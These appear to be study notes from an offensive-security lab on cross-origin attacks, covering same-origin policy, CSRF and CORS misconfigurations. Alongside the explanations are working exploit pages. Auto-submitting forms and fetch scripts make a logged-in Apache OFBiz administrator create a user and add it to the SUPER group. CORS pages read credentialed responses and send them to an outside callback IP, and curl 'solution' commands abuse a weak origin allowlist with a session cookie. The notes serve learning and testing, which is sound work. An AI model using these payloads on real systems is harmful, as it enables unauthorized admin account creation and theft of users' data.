
#### Cross-Origin Attacks

1
(Chris Richardson, 2021), https://microservices.io/patterns/monolithic.html ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Same-origin_policy ↩︎

3
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Cross-site_request_forgery ↩︎

4
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Cross-origin_resource_sharing ↩︎

##### Same-Origin Policy

An origin is the combination of a protocol, hostname, and port number.

The purpose of SOP is not to prevent the browser from sending a request for a resource, but to prevent JavaScript from reading the response.In other words, SOP allows images, IFrames, and other resources to be loaded onto the page, while blocking the JavaScript engine from accessing the contents of a response.

SOP allows images to be loaded cross-origin. However, it is important to note that this is allowed for image tags within HTML. If we attempt to load an image cross-domain with JavaScript, SOP should block JavaScript from accessing the response (unless it has been specifically allowed by CORS).


1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API ↩︎

###### SameSite Cookies

None, Lax, Strict


1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite ↩︎
`

###### Cross-Site Request Forgery (CSRF)

1
(OWASP, 2021), https://owasp.org/www-project-top-ten/ ↩︎

2
(Scott Helme, 2019), https://scotthelme.co.uk/csrf-is-really-dead/ ↩︎

There are two approaches that rely on a CSRF token cookie where browsers submit the value of the cookie in another way. The "cookie to header" approach uses client-side JavaScript to send the value as a request header. If the cookie value and request header value match on a request, the application can consider the request valid. This approach can be problematic as it requires JavaScript to gain access to the value in the first place. If JavaScript can access the cookie, a cross-site scripting (XSS) vulnerability could allow an attacker to gain access to the cookie and bypass the CSRF protection.

The "double submit" approach uses a hidden input field that contains the CSRF token value. Similar to the "cookie to header" approach, the web application can validate the cookie value matches in the input field value. One benefit of this approach is that JavaScript does not need access to the cookie containing the CSRF token. Additionally, the web application does not need to maintain a list of which tokens it has generated. It simply validates the values on any given request match.

###### Exploiting CSRF

One example is to place the URL that will execute the CSRF attack in an image tag. A browser will send a GET request for image tags. Attackers can leverage simple content injection vulnerabilities to create persistent CSRF attacks that target all users of the application via HTML tags that are essentially invisible, such as images or iFrames with no size.

Sending a POST request can be more difficult. We would need to trick the user into loading an HTML form that uses JavaScript to submit itself on the load event. This approach also restricts what content-types and HTTP methods we can use. For example, an HTML form cannot send JSON data natively. Standard HTML forms can only send GET and POST requests.

JavaScript APIs, such as XMLHttpRequest1 (XHR) and Fetch, can send requests with arbitrary HTTP methods and content-types. However, when used in this way, these APIs will send a preflight2 request to determine if Cross-Origin Resource Sharing (CORS) is enabled on the target server. We will discuss CORS later.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/XMLHttpRequest ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request ↩︎



##### Apache OFBiz

ofbiz1.html

```
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
	<input type="hidden" name="enabled">
	<input type="hidden" name="partyId">
	<input type="hidden" name="userLoginId" value="csrftest">
	<input type="hidden" name="currentPassword" value="password">
	<input type="hidden" name="currentPasswordVerify" value="password">
	<input type="hidden" name="passwordHint">
	<input type="hidden" name="requirePasswordChange" value="N">
	<input type="hidden" name="externalAuthId">
	<input type="hidden" name="securityQuestion">
	<input type="hidden" name="securityAnswer">
  </form>
</body>
</html>
```

ofbiz.html

```
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    document.forms['csrf2'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
  <input type="hidden" name="enabled">
  <input type="hidden" name="partyId">
  <input type="hidden" name="userLoginId" value="csrftest">
  <input type="hidden" name="currentPassword" value="password">
  <input type="hidden" name="currentPasswordVerify" value="password">
  <input type="hidden" name="passwordHint">
  <input type="hidden" name="requirePasswordChange" value="N">
  <input type="hidden" name="externalAuthId">
  <input type="hidden" name="securityQuestion">
  <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
  <input type="hidden" name="userLoginId" value="csrftest">
  <input type="hidden" name="partyId">
  <input type="hidden" name="groupId" value="SUPER">
  <input type="hidden" name="fromDate_i18n">
  <input type="hidden" name="fromDate">
  <input type="hidden" name="thruDate_i18n">
  <input type="hidden" name="thruDate">
  </form>
</body>
</html>


```


ofbiz2.html

```
<html>
<head>
<script>
  var username = "csrftest2";
  var password = "password";
  var host = "https://ofbiz:8443";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  var admin_params = "userLoginId=" +username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";

function send_create() { 
  console.log("Creating user..."); 
  fetch(host+create_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response) {
    send_admin();
  }); 
}

function send_admin() { 
  console.log("Adding admin role..."); 
  fetch(host+admin_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded' 
    },
    body : admin_params }
  ).then(
    console.log("Should be done...") 
  );
}

send_create();
</script>
</head>
<body></body>
</html>

```


1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#sending_a_request_with_credentials_included ↩︎

2
(Can I use, 2021), https://caniuse.com/same-site-cookie-attribute ↩︎

3
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Navigator/userAgent ↩︎

###### Anatomy of the CORS Request
Before sending the actual cross-origin request, the browser makes a preflight request to the intended destination using the OPTIONS HTTP method to determine if the requesting domain may perform the requested action.

```
OPTIONS /foo HTTP/1.1
Host: megacorpone.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://offensive-security.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-UserId
Listing 17 - Sample preflight request
```
All cross-origin requests, including the preflight request, include an Origin header with the value of the domain initiating the request. A preflight request may also include Access-Control-Request-Method and Access-Control-Request-Headers headers to indicate what HTTP method and request headers the browser will include on the actual request. The server will process these headers and respond with the allowed values.

Some cross-origin requests do not trigger a preflight request. These are known as simple requests,1 which include standard GET, HEAD, and POST requests. However, other request methods, requests with custom HTTP headers, or POST requests with nonstandard content-types will require a preflight request.

1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests ↩︎


###### Response Headers

Servers can set several headers1 to enable CORS. Let's review the most commonly encountered ones.

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 23 Jun 2021 17:38:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: https://offensive-security.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: X-UserId
Listing 18 - Sample preflight response
```

The Access-Control-Allow-Origin header indicates which origins are allowed to access resources from the server. A wildcard value (*) used in this header indicates any origin can access the resource. Generally, servers should only use this setting for resources that are considered publicly accessible. The header can also specify a single origin. If an application needs to allow multiple origins to access it, the application must contain logic to respond with the appropriate domain.

The Access-Control-Allow-Credentials header indicates if the browser should include credentials, such as cookies or authorization headers. The only valid value for this header is "true". Instead of setting a "false" value, servers can simply omit the header. A web application must set a non-wildcard value in the Access-Control-Allow-Origin header if it wishes to set Access-Control-Allow-Credentials to "true". However, the browser will enforce the SameSite attribute on any cookies that it would send cross-origin regardless of the destination's CORS settings. In other words, if the cookie has SameSite=Lax, the browser will not send it even if the preflight request indicates that the destination server allows credentials on CORS requests.

The Access-Control-Allow-Methods header indicates which HTTP methods cross-origin requests may use. The header value can contain one or more methods in a comma-separated list.

Similarly, the Access-Control-Allow-Headers header indicates which HTTP headers may be used on a cross-origin request. The header value can contain one or more header names in a comma-separated list. Browsers will consider some headers safe, such as Content-Type, and therefore, always use them in cross-origin requests.2 However, servers must use the Access-Control-Allow-Headers header to allow the authorization header or custom headers on CORS requests.

1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/CORS#cors_headers ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header ↩︎


###### Trusting Any Origin

cors1.html:
```
<html>
<head>
<script>
var url = "https://cors-sandbox/code";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    console.log(data);
  });
}

get_code();
</script>
</head>
<body></body>
</html>
```

cors2.html

```
<html>
<head>
<script>
var url = "https://cors-sandbox/code";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch('http://192.168.49.57/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors'
  });
  });
}

get_code();
</script>
</head>
<body></body>
</html>
```

cors3.html

```
<html>
<head>
<script>
var url = "https://cors-sandbox/exercise1";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch('http://192.168.49.57/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors'
  });
  });
}

get_code();
</script>
</head>
<body></body>
</html>
```

###### Improper Domain Allowlist

```
curl -X "OPTIONS" -i -k https://cors-sandbox/allowlist

curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.com" -k https://cors-sandbox/allowlist

curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.net" -k https://cors-sandbox/allowlist

curl -X "OPTIONS" -i -H "Origin: http://fakeoffensive-security.com" -k https://cors-sandbox/allowlist

```


Sol:

```
curl -X "OPTIONS" -i -H "Origin: https://evil.www.offensive-security.com" -k https://cors-sandbox/exercise2

curl -X "GET" -i -H "Origin: https://evil.www.offensive-security.com" -k https://cors-sandbox/exercise2 --cookie "SessionCookie=1123581321345589144"

```

